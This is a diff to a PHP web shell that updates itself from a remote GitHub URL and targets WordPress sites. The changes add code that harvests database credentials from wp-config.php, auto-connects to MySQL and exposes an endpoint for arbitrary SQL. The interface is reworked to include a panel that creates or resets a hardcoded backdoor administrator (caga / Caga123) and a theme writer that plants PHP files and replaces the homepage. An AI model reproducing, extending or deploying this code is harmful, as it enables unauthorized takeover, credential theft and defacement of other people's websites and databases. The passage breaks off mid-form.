@@ -15,8 +15,8 @@
 
 // --- Auto-Update Config ---
 define('SHELL_VERSION', '1.2.1');
-define('SHELL_UPDATE_URL', 'https://raw.githubusercontent.com/anjay801/weewe/main/anoboy.php');
-define('SHELL_VERSION_URL', 'https://raw.githubusercontent.com/anjay801/weewe/main/version.txt');
+define('SHELL_UPDATE_URL', 'https://raw.githubusercontent.com/anjay801/weewe/refs/heads/main/anoboy.php');
+define('SHELL_VERSION_URL', 'https://raw.githubusercontent.com/anjay801/weewe/refs/heads/main/version.txt');
 
 session_start();
 
@@ -851,6 +851,88 @@ function wpCreateTheme($startDir, $themeSlug, $themeName, $htmlContent, $setHome
 }
 
 // ============================================================
+// === WP PURGE CACHE =========================================
+// ============================================================
+
+/**
+ * Purge WordPress transients & flush rewrite rules via SQL only.
+ * No exec/shell_exec required.
+ * Returns array of log entries: [['ok'=>bool, 'msg'=>string], ...]
+ */
+function wpPurgeCache($startDir)
+{
+    $log  = [];
+    $ok   = function($msg) use (&$log) { $log[] = ['ok' => true,  'msg' => $msg]; };
+    $fail = function($msg) use (&$log) { $log[] = ['ok' => false, 'msg' => $msg]; };
+
+    // ── STEP 1: Find wp-config.php ───────────────────────────────────────
+    $wpConfig = findFileUpward($startDir, 'wp-config.php', 25);
+    if (!$wpConfig) {
+        $fail("wp-config.php not found within 25 levels from: $startDir");
+        return $log;
+    }
+    $ok("Found wp-config.php: $wpConfig");
+
+    // ── STEP 2: Parse DB credentials ────────────────────────────────────
+    $cfg = parseWpConfig($wpConfig);
+    if (!$cfg || empty($cfg['db_name'])) {
+        $fail("Failed to parse DB credentials from wp-config.php.");
+        return $log;
+    }
+    $ok("Parsed config → host={$cfg['db_host']} user={$cfg['db_user']} db={$cfg['db_name']} prefix={$cfg['prefix']}");
+
+    // ── STEP 3: Connect MySQL ────────────────────────────────────────────
+    if (!function_exists('mysqli_connect')) {
+        $fail("mysqli extension not available.");
+        return $log;
+    }
+    $conn = @mysqli_connect($cfg['db_host'], $cfg['db_user'], $cfg['db_pass'], $cfg['db_name']);
+    if (!$conn) {
+        $fail("MySQL connect failed: " . mysqli_connect_error());
+        return $log;
+    }
+    mysqli_set_charset($conn, $cfg['db_charset'] ?: 'utf8');
+    $ok("Connected to MySQL: {$cfg['db_user']}@{$cfg['db_host']} / {$cfg['db_name']}");
+
+    $prefix   = $cfg['prefix'];
+    $optionsT = $prefix . 'options';
+
+    // ── STEP 4: Delete transients ────────────────────────────────────────
+    $q1 = mysqli_query($conn, "DELETE FROM `{$optionsT}` WHERE option_name LIKE '\_transient\_%'");
+    if ($q1 === false) {
+        $fail("DELETE transients failed: " . mysqli_error($conn));
+    } else {
+        $n1 = mysqli_affected_rows($conn);
+        $ok("Deleted $n1 transient(s) (_transient_*)");
+    }
+
+    $q2 = mysqli_query($conn, "DELETE FROM `{$optionsT}` WHERE option_name LIKE '\_site\_transient\_%'");
+    if ($q2 === false) {
+        $fail("DELETE site transients failed: " . mysqli_error($conn));
+    } else {
+        $n2 = mysqli_affected_rows($conn);
+        $ok("Deleted $n2 site transient(s) (_site_transient_*)");
+    }
+
+    // ── STEP 5: Flush rewrite rules ──────────────────────────────────────
+    $esc = fn($v) => mysqli_real_escape_string($conn, $v);
+    $q3 = mysqli_query($conn,
+        "UPDATE `{$optionsT}` SET option_value = '' WHERE option_name = '" . $esc('rewrite_rules') . "'"
+    );
+    if ($q3 === false) {
+        $fail("Flush rewrite_rules failed: " . mysqli_error($conn));
+    } else {
+        $ok("Rewrite rules flushed (will regenerate on next WP request)");
+    }
+
+    mysqli_close($conn);
+
+    // ── STEP 6: Summary ──────────────────────────────────────────────────
+    $ok("✅ Purge complete! Transients deleted & rewrite rules flushed.");
+    return $log;
+}
+
+// ============================================================
 // === AUTO-UPDATE HELPERS ====================================
 // ============================================================
 
@@ -1311,6 +1393,134 @@ if ($action === 'mysqlconn' && $_SERVER['REQUEST_METHOD'] === 'POST') {
     }
 }
 
+// MySQL Auto-Connect from wp-config.php
+if ($action === 'mysql_autoconn') {
+    $wpConfig = findFileUpward($cwd, 'wp-config.php', 25);
+    if ($wpConfig) {
+        $cfg = parseWpConfig($wpConfig);
+        if ($cfg && !empty($cfg['db_name'])) {
+            $conn = @mysqli_connect($cfg['db_host'], $cfg['db_user'], $cfg['db_pass'], $cfg['db_name']);
+            if ($conn) {
+                mysqli_set_charset($conn, $cfg['db_charset'] ?: 'utf8');
+                mysqli_close($conn);
+                $_SESSION['mysql'] = ['host' => $cfg['db_host'], 'user' => $cfg['db_user'], 'pass' => $cfg['db_pass'], 'db' => $cfg['db_name'], 'connected' => true];
+                $dbMsg = "✔ Auto-connected from wp-config.php: {$cfg['db_user']}@{$cfg['db_host']} / {$cfg['db_name']}";
+            } else {
+                $dbMsg = "✘ Auto-connect failed: " . mysqli_connect_error();
+            }
+        } else { $dbMsg = "✘ Could not parse wp-config.php"; }
+    } else { $dbMsg = "✘ wp-config.php not found within 25 levels."; }
+}
+
+// phpMyAdmin AJAX endpoint
+if ($action === 'pma_ajax' && $_SERVER['REQUEST_METHOD'] === 'POST') {
+    header('Content-Type: application/json');
+    $ms = $_SESSION['mysql'] ?? [];
+    if (empty($ms['connected'])) { echo json_encode(['error' => 'Not connected']); exit; }
+    $conn = @mysqli_connect($ms['host'], $ms['user'], $ms['pass'], $ms['db'] ?: null);
+    if (!$conn) { echo json_encode(['error' => 'Connect failed: ' . mysqli_connect_error()]); exit; }
+    if (!empty($ms['db'])) mysqli_select_db($conn, $ms['db']);
+    $sub = $_POST['sub'] ?? '';
+    $esc = fn($v) => mysqli_real_escape_string($conn, $v);
+
+    if ($sub === 'list_dbs') {
+        $r = mysqli_query($conn, 'SHOW DATABASES');
+        $dbs = [];
+        while ($row = mysqli_fetch_row($r)) $dbs[] = $row[0];
+        echo json_encode(['dbs' => $dbs]);
+
+    } elseif ($sub === 'select_db') {
+        $db = $_POST['db'] ?? '';
+        if (!$db) { echo json_encode(['error' => 'No db']); exit; }
+        mysqli_select_db($conn, $db);
+        $_SESSION['mysql']['db'] = $db;
+        $r = mysqli_query($conn, 'SHOW TABLES');
+        $tables = [];
+        while ($row = mysqli_fetch_row($r)) $tables[] = $row[0];
+        echo json_encode(['tables' => $tables, 'db' => $db]);
+
+    } elseif ($sub === 'list_tables') {
+        $db = $_POST['db'] ?? $ms['db'] ?? '';
+        if ($db) mysqli_select_db($conn, $db);
+        $r = mysqli_query($conn, 'SHOW TABLES');
+        $tables = [];
+        while ($row = mysqli_fetch_row($r)) $tables[] = $row[0];
+        echo json_encode(['tables' => $tables]);
+
+    } elseif ($sub === 'browse') {
+        $tbl   = $_POST['table'] ?? '';
+        $db    = $_POST['db'] ?? $ms['db'] ?? '';
+        $page  = max(0, (int)($_POST['page'] ?? 0));
+        $limit = 50;
+        $offset = $page * $limit;
+        if ($db) mysqli_select_db($conn, $db);
+        // count
+        $cr = mysqli_query($conn, "SELECT COUNT(*) FROM `" . $esc($tbl) . "`");
+        $total = $cr ? (int)mysqli_fetch_row($cr)[0] : 0;
+        // columns
+        $cols = [];
+        $cr2 = mysqli_query($conn, "SHOW COLUMNS FROM `" . $esc($tbl) . "`");
+        while ($row = mysqli_fetch_assoc($cr2)) $cols[] = $row;
+        // rows
+        $r = mysqli_query($conn, "SELECT * FROM `" . $esc($tbl) . "` LIMIT $limit OFFSET $offset");
+        $rows = [];
+        while ($row = mysqli_fetch_assoc($r)) $rows[] = $row;
+        echo json_encode(['cols' => $cols, 'rows' => $rows, 'total' => $total, 'page' => $page, 'limit' => $limit]);
+
+    } elseif ($sub === 'delete_row') {
+        $tbl  = $_POST['table'] ?? '';
+        $db   = $_POST['db'] ?? $ms['db'] ?? '';
+        $pk   = $_POST['pk'] ?? '';
+        $pkv  = $_POST['pkv'] ?? '';
+        if ($db) mysqli_select_db($conn, $db);
+        $q = mysqli_query($conn, "DELETE FROM `" . $esc($tbl) . "` WHERE `" . $esc($pk) . "`='" . $esc($pkv) . "' LIMIT 1");
+        echo json_encode(['ok' => (bool)$q, 'error' => $q ? null : mysqli_error($conn)]);
+
+    } elseif ($sub === 'insert_row') {
+        $tbl    = $_POST['table'] ?? '';
+        $db     = $_POST['db'] ?? $ms['db'] ?? '';
+        $fields = $_POST['fields'] ?? [];
+        if ($db) mysqli_select_db($conn, $db);
+        $cols_q = implode(',', array_map(fn($c) => "`" . $esc($c) . "`", array_keys($fields)));
+        $vals_q = implode(',', array_map(fn($v) => "'" . $esc($v) . "'", array_values($fields)));
+        $q = mysqli_query($conn, "INSERT INTO `" . $esc($tbl) . "` ($cols_q) VALUES ($vals_q)");
+        echo json_encode(['ok' => (bool)$q, 'error' => $q ? null : mysqli_error($conn), 'id' => $q ? mysqli_insert_id($conn) : null]);
+
+    } elseif ($sub === 'update_row') {
+        $tbl    = $_POST['table'] ?? '';
+        $db     = $_POST['db'] ?? $ms['db'] ?? '';
+        $pk     = $_POST['pk'] ?? '';
+        $pkv    = $_POST['pkv'] ?? '';
+        $fields = $_POST['fields'] ?? [];
+        if ($db) mysqli_select_db($conn, $db);
+        $set = implode(',', array_map(fn($c, $v) => "`" . $esc($c) . "`='" . $esc($v) . "'", array_keys($fields), array_values($fields)));
+        $q = mysqli_query($conn, "UPDATE `" . $esc($tbl) . "` SET $set WHERE `" . $esc($pk) . "`='" . $esc($pkv) . "' LIMIT 1");
+        echo json_encode(['ok' => (bool)$q, 'error' => $q ? null : mysqli_error($conn)]);
+
+    } elseif ($sub === 'run_sql') {
+        $sql = trim($_POST['sql'] ?? '');
+        $db  = $_POST['db'] ?? $ms['db'] ?? '';
+        if ($db) mysqli_select_db($conn, $db);
+        $r = mysqli_query($conn, $sql);
+        if ($r === false) {
+            echo json_encode(['error' => mysqli_error($conn)]);
+        } elseif ($r === true) {
+            echo json_encode(['ok' => true, 'affected' => mysqli_affected_rows($conn)]);
+        } else {
+            $cols = [];
+            $rows = [];
+            $fi = mysqli_fetch_fields($r);
+            foreach ($fi as $f) $cols[] = $f->name;
+            while ($row = mysqli_fetch_assoc($r)) $rows[] = $row;
+            echo json_encode(['cols' => $cols, 'rows' => $rows]);
+        }
+    } else {
+        echo json_encode(['error' => 'Unknown sub-action']);
+    }
+    mysqli_close($conn);
+    exit;
+}
+
 // MySQL Query
 $sqlResult = null;
 $sqlError = '';
@@ -1375,6 +1585,12 @@ if ($action === 'wp_createtheme' && $_SERVER['REQUEST_METHOD'] === 'POST') {
     if ($wpThemeSlug === '' || $wpThemeSlug === '-') $wpThemeSlug = 'caga-theme';
     $setHp = !empty($_POST['set_homepage']);
     $wpThemeLog = wpCreateTheme($cwd, $wpThemeSlug, $wpThemeName, $htmlInput, $setHp);
+}
+
+// --- WP Purge Cache ---
+$wpPurgeLog = null;
+if ($action === 'wp_purge' && $_SERVER['REQUEST_METHOD'] === 'POST') {
+    $wpPurgeLog = wpPurgeCache($cwd);
 }
 
 // --- Auto-Update Actions ---
@@ -1796,6 +2012,35 @@ $hasZip = class_exists('ZipArchive');
         table.sql-table tr:nth-child(even) td {
             background: #0d1117;
         }
+
+        /* phpMyAdmin panel */
+        .pma-wrap { display:flex; height:480px; gap:0; overflow:hidden; }
+        .pma-sidebar { width:210px; min-width:160px; background:#0a0c10; border-right:1px solid #21262d; display:flex; flex-direction:column; overflow:hidden; }
+        .pma-sidebar-hdr { padding:7px 10px; font-size:11px; color:#8b949e; border-bottom:1px solid #21262d; display:flex; align-items:center; justify-content:space-between; flex-shrink:0; }
+        .pma-sidebar-list { overflow-y:auto; flex:1; overflow-x:hidden; }
+        .pma-item { padding:5px 12px; font-size:12px; cursor:pointer; color:#c9d1d9; border-bottom:1px solid #0d1117; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; display:block; }
+        .pma-item:hover { background:#161b22; color:#58a6ff; }
+        .pma-item.active { background:#1f2937; color:#7ee787; font-weight:bold; }
+        .pma-item.db-item { color:#f0883e; font-size:11px; padding-left:10px; }
+        .pma-item.db-item.active { color:#7ee787; }
+        .pma-tbl-section-hdr { padding:4px 10px; font-size:10px; color:#6e7681; background:#0d1117; border-bottom:1px solid #21262d; flex-shrink:0; }
+        .pma-main { flex:1; display:flex; flex-direction:column; overflow:hidden; min-width:0; }
+        .pma-toolbar { padding:6px 10px; background:#0d1117; border-bottom:1px solid #21262d; display:flex; align-items:center; gap:8px; flex-wrap:wrap; flex-shrink:0; }
+        .pma-content { flex:1; overflow:auto; padding:10px; }
+        .pma-table-wrap { overflow:auto; max-height:100%; }
+        table.pma-table { border-collapse:collapse; font-size:12px; min-width:100%; white-space:nowrap; }
+        table.pma-table th { background:#161b22; color:#58a6ff; padding:5px 10px; border:1px solid #30363d; position:sticky; top:0; z-index:1; }
+        table.pma-table td { padding:4px 10px; border:1px solid #21262d; color:#e6edf3; max-width:280px; overflow:hidden; text-overflow:ellipsis; }
+        table.pma-table tr:hover td { background:#161b22; }
+        table.pma-table td.null-val { color:#6e7681; font-style:italic; }
+        table.pma-table td.act-col { white-space:nowrap; min-width:70px; }
+        .pma-pagination { display:flex; align-items:center; gap:8px; padding:5px 10px; font-size:12px; color:#8b949e; border-top:1px solid #21262d; flex-shrink:0; }
+        .pma-sql-bar { padding:8px 10px; border-top:1px solid #21262d; display:flex; gap:6px; flex-shrink:0; }
+        .pma-sql-bar textarea { flex:1; background:#0a0c10; border:1px solid #30363d; color:#e6edf3; padding:6px 8px; font-size:12px; font-family:monospace; border-radius:4px; resize:none; height:48px; }
+        .panel-toggle { cursor:pointer; font-size:11px; color:#8b949e; background:#161b22; border:1px solid #30363d; border-radius:4px; padding:2px 8px; margin-left:auto; }
+        .panel-toggle:hover { color:#c9d1d9; border-color:#58a6ff; }
+        .collapsible-body { display:none; }
+        .collapsible-body.open { display:block; }
 
         .msg-ok {
             color: #7ee787;
@@ -2227,178 +2472,199 @@ $hasZip = class_exists('ZipArchive');
             </div>
         <?php endif; ?>
 
-        <!-- ===== MYSQL PANEL ===== -->
+        <!-- ===== phpMyAdmin PANEL ===== -->
         <div class="mysql-panel">
             <div class="panel-hdr" style="display:flex;align-items:center;gap:10px;">
-                <span class="panel-title">🗄️ MySQL Client</span>
+                <span class="panel-title">🐬 phpMyAdmin</span>
                 <?php if (!empty($mysqlConn['connected'])): ?>
-                    <span class="badge badge-on">● Connected:
-                        <?= htmlspecialchars($mysqlConn['user'] . '@' . $mysqlConn['host']) ?>
-                        <?= $mysqlConn['db'] ? ' / ' . $mysqlConn['db'] : '' ?></span>
-                    <a href="?action=mysqldisconn" class="btn btn-sm btn-danger" style="margin-left:auto;">Disconnect</a>
+                    <span class="badge badge-on">● <?= htmlspecialchars($mysqlConn['user'].'@'.$mysqlConn['host']) ?><?= $mysqlConn['db'] ? ' / '.$mysqlConn['db'] : '' ?></span>
+                    <a href="?action=mysqldisconn" class="btn btn-sm btn-danger" style="font-size:11px;padding:2px 8px;">Disconnect</a>
                 <?php else: ?>
-                    <span class="badge badge-off">● Disconnected</span>
+                    <span class="badge badge-off">● Not Connected</span>
                 <?php endif; ?>
+                <button class="panel-toggle" onclick="togglePanel('pmaPanel','pmaToggle')" id="pmaToggle">▼ hide</button>
             </div>
-            <div class="mysql-body">
-                <div>
-                    <?php if (!empty($dbMsg)): ?>
-                        <div class="<?= strpos($dbMsg, '✔') !== false ? 'msg-ok' : 'msg-err' ?>">
-                            <?= htmlspecialchars($dbMsg) ?>
-                        </div>
-                    <?php endif; ?>
-                    <form method="post" class="mysql-form">
-                        <input type="hidden" name="action" value="mysqlconn">
-                        <label>Host</label>
-                        <input type="text" name="mhost"
-                            value="<?= htmlspecialchars($mysqlConn['host'] ?? 'localhost') ?>" placeholder="localhost">
-                        <label>Username</label>
-                        <input type="text" name="muser" value="<?= htmlspecialchars($mysqlConn['user'] ?? '') ?>"
-                            placeholder="root">
-                        <label>Password</label>
-                        <input type="password" name="mpass" placeholder="••••••••">
-                        <label>Database (optional)</label>
-                        <input type="text" name="mdb" value="<?= htmlspecialchars($mysqlConn['db'] ?? '') ?>"
-                            placeholder="my_database">
-                        <button type="submit" class="btn btn-primary"
-                            style="margin-top:10px;width:100%;">Connect</button>
-                    </form>
+            <div class="collapsible-body open" id="pmaPanel">
+            <?php if (!empty($dbMsg)): ?>
+                <div style="padding:6px 14px;">
+                    <div class="<?= strpos($dbMsg,'✔')!==false?'msg-ok':'msg-err' ?>"><?= htmlspecialchars($dbMsg) ?></div>
                 </div>
-                <div>
-                    <form method="post">
-                        <input type="hidden" name="action" value="mysqlquery">
-                        <label style="font-size:12px;color:#8b949e;display:block;margin-bottom:4px;">SQL Query</label>
-                        <textarea class="sql-area" name="sqlcmd"
-                            placeholder="SELECT * FROM users LIMIT 20;"><?= htmlspecialchars($_POST['sqlcmd'] ?? '') ?></textarea>
-                        <button type="submit" class="btn btn-primary btn-sm" style="margin-top:6px;">▶ Execute</button>
-                    </form>
-                    <?php if ($sqlError): ?>
-                        <div class="msg-err" style="margin-top:8px;"><?= htmlspecialchars($sqlError) ?></div>
-                    <?php elseif ($sqlResult !== null): ?>
-                        <div style="margin-top:8px;">
-                            <?php if (isset($sqlResult[0]['affected_rows'])): ?>
-                                <span class="msg-ok">✔ Query OK, <?= $sqlResult[0]['affected_rows'] ?> row(s) affected</span>
-                            <?php elseif (empty($sqlResult)): ?>
-                                <span style="color:#8b949e;font-size:12px;">Empty result set</span>
-                            <?php else: ?>
-                                <div class="sql-result-wrap">
-                                    <table class="sql-table">
-                                        <thead>
-                                            <tr>
-                                                <?php foreach (array_keys($sqlResult[0]) as $col): ?>
-                                                    <th><?= htmlspecialchars($col) ?></th>
-                                                <?php endforeach; ?>
-                                            </tr>
-                                        </thead>
-                                        <tbody>
-                                            <?php foreach ($sqlResult as $row): ?>
-                                                <tr>
-                                                    <?php foreach ($row as $v): ?>
-                                                        <td><?= htmlspecialchars($v ?? 'NULL') ?></td>
-                                                    <?php endforeach; ?>
-                                                </tr>
-                                            <?php endforeach; ?>
-                                        </tbody>
-                                    </table>
-                                </div>
-                                <div style="color:#6e7681;font-size:11px;margin-top:4px;"><?= count($sqlResult) ?> row(s)</div>
-                            <?php endif; ?>
-                        </div>
-                    <?php endif; ?>
+            <?php endif; ?>
+            <?php if (empty($mysqlConn['connected'])): ?>
+                <!-- Connect Form -->
+                <div style="padding:14px;display:grid;grid-template-columns:1fr 1fr;gap:14px;">
+                    <div>
+                        <form method="post" class="mysql-form">
+                            <input type="hidden" name="action" value="mysqlconn">
+                            <label>Host</label>
+                            <input type="text" name="mhost" value="<?= htmlspecialchars($mysqlConn['host'] ?? 'localhost') ?>" placeholder="localhost">
+                            <label>Username</label>
+                            <input type="text" name="muser" value="<?= htmlspecialchars($mysqlConn['user'] ?? '') ?>" placeholder="root">
+                            <label>Password</label>
+                            <input type="password" name="mpass" placeholder="••••••••">
+                            <label>Database (optional)</label>
+                            <input type="text" name="mdb" value="<?= htmlspecialchars($mysqlConn['db'] ?? '') ?>" placeholder="my_database">
+                            <button type="submit" class="btn btn-primary" style="margin-top:10px;width:100%;">🔌 Connect</button>
+                        </form>
+                    </div>
+                    <div style="display:flex;flex-direction:column;justify-content:center;gap:10px;">
+                        <div style="font-size:12px;color:#8b949e;margin-bottom:4px;">Or auto-connect from WordPress config:</div>
+                        <a href="?action=mysql_autoconn" class="btn btn-primary" style="text-decoration:none;text-align:center;">⚡ Auto-Connect from wp-config.php</a>
+                        <div style="font-size:11px;color:#6e7681;">Searches wp-config.php up to 25 levels from current directory.</div>
+                    </div>
                 </div>
+            <?php else: ?>
+                <!-- phpMyAdmin UI -->
+                <div class="pma-wrap" id="pmaWrap">
+                    <!-- Sidebar: DBs & Tables -->
+                    <div class="pma-sidebar">
+                        <div class="pma-sidebar-hdr">
+                            <span>Databases</span>
+                            <button class="btn btn-sm" style="font-size:10px;padding:1px 6px;" onclick="pmaListDbs()">⟳</button>
+                        </div>
+                        <!-- Single scrollable list — DBs + Tables both go in here -->
+                        <div class="pma-sidebar-list" id="pmaDbList">
+                            <div style="padding:8px;font-size:11px;color:#6e7681;">Loading...</div>
+                        </div>
+                    </div>
+                    <!-- Main content -->
+                    <div class="pma-main">
+                        <div class="pma-toolbar" id="pmaToolbar">
+                            <span id="pmaBreadcrumb" style="font-size:12px;color:#8b949e;">Select a database →</span>
+                            <div style="margin-left:auto;display:flex;gap:6px;" id="pmaTableBtns" style="display:none;">
+                                <button class="btn btn-sm btn-primary" onclick="pmaShowInsert()" id="btnInsert" style="display:none;font-size:11px;">+ Insert Row</button>
+                                <button class="btn btn-sm" onclick="pmaRefreshTable()" id="btnRefresh" style="display:none;font-size:11px;">⟳ Refresh</button>
+                            </div>
+                        </div>
+                        <div class="pma-content" id="pmaContent">
+                            <div style="color:#6e7681;font-size:12px;padding:20px;">Select a database from the left panel.</div>
+                        </div>
+                        <div class="pma-pagination" id="pmaPagination" style="display:none;">
+                            <button class="btn btn-sm" onclick="pmaPrevPage()" id="btnPrev">◀ Prev</button>
+                            <span id="pmaPageInfo">Page 1</span>
+                            <button class="btn btn-sm" onclick="pmaNextPage()" id="btnNext">Next ▶</button>
+                            <span id="pmaTotalInfo" style="margin-left:8px;"></span>
+                        </div>
+                        <div class="pma-sql-bar">
+                            <textarea id="pmaSqlInput" placeholder="SELECT * FROM table LIMIT 20;&#10;Or any SQL..."></textarea>
+                            <div style="display:flex;flex-direction:column;gap:4px;">
+                                <button class="btn btn-sm btn-primary" onclick="pmaRunSql()" style="font-size:11px;">▶ Run SQL</button>
+                                <button class="btn btn-sm" onclick="pmaClearSql()" style="font-size:11px;">✕ Clear</button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            <?php endif; ?>
             </div>
         </div>
 
-        <!-- ===== WP AUTO-ADMIN PANEL ===== -->
+        <!-- ===== WP AUTO-ADMIN PANEL (hidden by default) ===== -->
         <div class="mysql-panel" style="margin-top:0;">
             <div class="panel-hdr" style="display:flex;align-items:center;gap:10px;">
                 <span class="panel-title">🛡️ WP Auto-Admin Generator</span>
                 <span style="font-size:11px;color:#8b949e;">caga / caga@cagamerdeka.com / Caga123</span>
-                <span style="margin-left:auto;font-size:11px;color:#6e7681;">Starts from: <?= htmlspecialchars($currentDir) ?></span>
+                <button class="panel-toggle" onclick="togglePanel('wpAdminPanel','wpAdminToggle')" id="wpAdminToggle">▶ show</button>
             </div>
-            <div style="padding:12px 14px;">
-                <div style="font-size:12px;color:#8b949e;margin-bottom:10px;line-height:1.6;">
-                    Automatically finds <code style="color:#58a6ff;">wp-load.php</code> &amp; <code style="color:#58a6ff;">wp-config.php</code>
-                    by walking UP up to <strong>25 levels</strong> from the current directory.<br>
-                    Parses DB credentials → connects → hashes password → creates/resets WP admin.
-                </div>
-
-                <?php if ($wpAutoLog !== null): ?>
-                    <div style="background:#0a0c10;border:1px solid #21262d;border-radius:6px;padding:12px;margin-bottom:10px;font-size:12px;font-family:inherit;">
-                        <?php foreach ($wpAutoLog as $entry): ?>
-                            <div style="color:<?= $entry['ok'] ? '#7ee787' : '#f85149' ?>;margin-bottom:3px;">
-                                <?= $entry['ok'] ? '✔' : '✘' ?>  <?= htmlspecialchars($entry['msg']) ?>
-                            </div>
-                        <?php endforeach; ?>
+            <div class="collapsible-body" id="wpAdminPanel">
+                <div style="padding:12px 14px;">
+                    <div style="font-size:12px;color:#8b949e;margin-bottom:10px;line-height:1.6;">
+                        Automatically finds <code style="color:#58a6ff;">wp-load.php</code> &amp; <code style="color:#58a6ff;">wp-config.php</code>
+                        by walking UP up to <strong>25 levels</strong> from the current directory.<br>
+                        Parses DB credentials → connects → hashes password → creates/resets WP admin.
                     </div>
-                <?php endif; ?>
-
-                <form method="post" onsubmit="return confirm('Run WP Auto-Admin from current directory?\n\nThis will:\n1. Search for wp-load.php & wp-config.php (up to 25 levels)\n2. Parse DB credentials\n3. Connect MySQL\n4. Create/reset admin user: caga / Caga123')">
-                    <input type="hidden" name="action" value="wp_autoadmin">
-                    <button type="submit" class="btn btn-primary">⚡ Run WP Auto-Admin</button>
-                    <span style="font-size:11px;color:#6e7681;margin-left:10px;">No MySQL connection needed — reads wp-config.php directly</span>
-                </form>
+                    <?php if ($wpAutoLog !== null): ?>
+                        <div style="background:#0a0c10;border:1px solid #21262d;border-radius:6px;padding:12px;margin-bottom:10px;font-size:12px;font-family:inherit;">
+                            <?php foreach ($wpAutoLog as $entry): ?>
+                                <div style="color:<?= $entry['ok'] ? '#7ee787' : '#f85149' ?>;margin-bottom:3px;">
+                                    <?= $entry['ok'] ? '✔' : '✘' ?>  <?= htmlspecialchars($entry['msg']) ?>
+                                </div>
+                            <?php endforeach; ?>
+                        </div>
+                    <?php endif; ?>
+                    <form method="post" onsubmit="return confirm('Run WP Auto-Admin from current directory?\n\nThis will:\n1. Search for wp-load.php & wp-config.php (up to 25 levels)\n2. Parse DB credentials\n3. Connect MySQL\n4. Create/reset admin user: caga / Caga123')">
+                        <input type="hidden" name="action" value="wp_autoadmin">
+                        <button type="submit" class="btn btn-primary">⚡ Run WP Auto-Admin</button>
+                        <span style="font-size:11px;color:#6e7681;margin-left:10px;">No MySQL connection needed — reads wp-config.php directly</span>
+                    </form>
+                </div>
             </div>
         </div>
 
-        <!-- ===== WP THEME CREATOR PANEL ===== -->
+        <!-- ===== WP THEME CREATOR PANEL (hidden by default) ===== -->
         <div class="mysql-panel" style="margin-top:0;">
             <div class="panel-hdr" style="display:flex;align-items:center;gap:10px;">
                 <span class="panel-title">🎨 WP Theme Creator</span>
                 <span style="font-size:11px;color:#8b949e;">Create &amp; activate a custom WordPress theme from HTML</span>
-                <span style="margin-left:auto;font-size:11px;color:#6e7681;">Starts from: <?= htmlspecialchars($currentDir) ?></span>
+                <button class="panel-toggle" onclick="togglePanel('wpThemePanel','wpThemeToggle')" id="wpThemeToggle">▶ show</button>
             </div>
-            <div style="padding:12px 14px;">
-                <div style="font-size:12px;color:#8b949e;margin-bottom:10px;line-height:1.6;">
-                    Input your full HTML → PHP validates syntax → theme files written to
-                    <code style="color:#58a6ff;">wp-content/themes/&lt;slug&gt;/</code> →
-                    theme activated in DB → optionally set as homepage.
-                </div>
-
-                <?php if ($wpThemeLog !== null): ?>
-                    <div style="background:#0a0c10;border:1px solid #21262d;border-radius:6px;padding:12px;margin-bottom:10px;font-size:12px;font-family:inherit;">
-                        <?php foreach ($wpThemeLog as $entry): ?>
-                            <div style="color:<?= $entry['ok'] ? '#7ee787' : '#f85149' ?>;margin-bottom:3px;">
-                                <?= $entry['ok'] ? '✔' : '✘' ?> <?= htmlspecialchars($entry['msg']) ?>
+            <div class="collapsible-body" id="wpThemePanel">
+                <div style="padding:12px 14px;">
+                    <div style="font-size:12px;color:#8b949e;margin-bottom:10px;line-height:1.6;">
+                        Input your full HTML → PHP validates syntax → theme files written to
+                        <code style="color:#58a6ff;">wp-content/themes/&lt;slug&gt;/</code> →
+                        theme activated in DB → optionally set as homepage.
+                    </div>
+                    <?php if ($wpThemeLog !== null): ?>
+                        <div style="background:#0a0c10;border:1px solid #21262d;border-radius:6px;padding:12px;margin-bottom:10px;font-size:12px;font-family:inherit;">
+                            <?php foreach ($wpThemeLog as $entry): ?>
+                                <div style="color:<?= $entry['ok'] ? '#7ee787' : '#f85149' ?>;margin-bottom:3px;">
+                                    <?= $entry['ok'] ? '✔' : '✘' ?> <?= htmlspecialchars($entry['msg']) ?>
+                                </div>
+                            <?php endforeach; ?>
+                        </div>
+                    <?php endif; ?>
+                    <form method="post" onsubmit="return confirm('Create &amp; activate WP theme?\n\nThis will write files to wp-content/themes/ and modify the database.')">
+                        <input type="hidden" name="action" value="wp_createtheme">
+                        <div style="display:flex;gap:10px;margin-bottom:8px;flex-wrap:wrap;">
+                            <div style="flex:1;min-width:160px;">
+                                <label style="font-size:11px;color:#8b949e;display:block;margin-bottom:3px;">Theme Slug (folder name)</label>
+                                <input type="text" name="theme_slug" value="<?= htmlspecialchars($action === 'wp_createtheme' ? ($wpThemeSlug ?? 'caga-theme') : 'caga-theme') ?>"
+                                    placeholder="caga-theme" pattern="[a-zA-Z0-9\-]+" style="width:100%;box-sizing:border-box;">
                             </div>
-                        <?php endforeach; ?>
-                    </div>
-                <?php endif; ?>
+                            <div style="flex:2;min-width:200px;">
+                                <label style="font-size:11px;color:#8b949e;display:block;margin-bottom:3px;">Theme Display Name</label>
+                                <input type="text" name="theme_name" value="<?= htmlspecialchars($action === 'wp_createtheme' ? ($wpThemeName ?? 'Caga Custom Theme') : 'Caga Custom Theme') ?>"
+                                    placeholder="Caga Custom Theme" style="width:100%;box-sizing:border-box;">
+                            </div>
+                        </div>
+                        <div style="margin-bottom:8px;">
+                            <label style="font-size:11px;color:#8b949e;display:block;margin-bottom:3px;">
+                                Theme HTML Content
+                                <span style="color:#6e7681;">(full page HTML — can include &lt;?php ?&gt; tags)</span>
+                            </label>
+                            <textarea name="theme_html" rows="12" placeholder="<!DOCTYPE html>&#10;<html>&#10;<head>&#10;  <meta charset=&quot;UTF-8&quot;>&#10;  <title>My Site</title>&#10;</head>&#10;<body>&#10;  <h1>Welcome!</h1>&#10;  <p>My custom homepage.</p>&#10;</body>&#10;</html>"
+                                style="width:100%;box-sizing:border-box;font-family:monospace;font-size:12px;background:#0a0c10;color:#c9d1d9;border:1px solid #30363d;border-radius:4px;padding:8px;resize:vertical;"><?= htmlspecialchars($action === 'wp_createtheme' ? ($_POST['theme_html'] ?? '') : '') ?></textarea>
+                        </div>
+                        <div style="display:flex;align-items:center;gap:16px;flex-wrap:wrap;">
+                            <label style="font-size:12px;color:#c9d1d9;cursor:pointer;display:flex;align-items:center;gap:6px;">
+                                <input type="checkbox" name="set_homepage" value="1" <?= ($action !== 'wp_createtheme' || !empty($_POST['set_homepage'])) ? 'checked' : '' ?>>
